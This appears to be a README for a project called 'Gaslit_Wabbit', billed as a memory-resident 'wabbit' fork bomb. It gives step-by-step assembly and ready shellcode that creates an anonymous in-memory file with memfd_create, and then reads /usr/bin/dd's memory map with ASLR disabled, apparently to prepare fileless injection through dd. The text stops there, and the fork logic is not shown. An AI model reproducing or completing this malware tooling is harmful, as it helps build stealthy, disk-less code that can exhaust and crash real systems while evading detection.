# Gaslit_Wabbit
1978 wabbit fork bomb running in Ram

first we get the syscall numbers for
- memfd_create
- pause
- exit

```shell
cat /usr/include/x86_64-linux-gnu/asm/unistd_64.h | grep memfd_create
```
- ```#define __NR_memfd_create 319```

```shell
cat /usr/include/x86_64-linux-gnu/asm/unistd_64.h | grep pause
```
- ```#define __NR_pause 34```

```shell
cat /usr/include/x86_64-linux-gnu/asm/unistd_64.h | grep exit
```
- ```#define __NR_exit 60```



next we create some assembly that will
- duplicate FDs: 10 and 11
```asm
xor rax, rax
xor rdi, rdi
mov di, 10
mov rax, 0x20
syscall
xor rax, rax
inc rdi
mov rax, 0x20
syscall
```
- create an in-memory-only file (syscall 319)
```asm
push 0x78436f73
mov rdi, rsp
mov rsi, 0
mov rax, 319
syscall
```
- suspend the process (syscall 34)
```asm
mov rax, 34
syscall
```
- exit process (syscall 60) (should never be reached)
```asm
xor rax, rax
add rax, 60
xor rdi, rdi
syscall
```
putting it all together:

```asm
BITS 64
global _start
section .text
_start:
        xor rax, rax
        xor rdi, rdi
        mov di, 10
        mov rax, 0x20
        syscall
        xor rax, rax
        inc rdi
        mov rax, 0x20
        syscall
memfd_create:
        push 0x78436f73
        mov rdi, rsp
        mov rsi, 0
        mov rax, 319
        syscall
pause:
        mov rax, 34
        syscall
exit:
        xor rax, rax
        add rax, 60
        xor rdi, rdi
        syscall
```

next, we nasm the assembly code and do a hexdump,

```shell
nasm memfd.asm
```
```shell
hexdump -v -e '"\\""x" 1/1 "%02x" ""' memfd
```
- ```\x48\x31\xc0\x48\x31\xff\x66\xbf\x0a\x00\xb8\x20\x00\x00\x00\x0f\x05\x48\x31\xc0\x48\xff\xc7\xb8\x20\x00\x00\x00\x0f\x05\x68\x73\x6f\x43\x78\x48\x89\xe7\xbe\x00\x00\x00\x00\xb8\x3f\x01\x00\x00\x0f\x05\xb8\x22\x00\x00\x00\x0f\x05\x48\x31\xc0\x48\x83\xc0\x3c\x48\x31\xff\x0f\x05```

next, we find the PID addresses for DD fclose,

```shell
setarch x86_64 -R dd if=/proc/self/maps | grep "bin/dd"
```
- ```555555554000-555555556000 r--p 00000000 ca:01 262762                     /usr/bin/dd
555555556000-555555564000 r-xp 00002000 ca:01 262762                     /usr/bin/dd
555555564000-555555569000 r--p 00010000 ca:01 262762                     /usr/bin/dd
555555569000-55555556a000 r--p 00014000 ca:01 262762                     /usr/bin/dd
55555556a000-55555556b000 rw-p 00015000 ca:01 262762                     /usr/bin/dd
```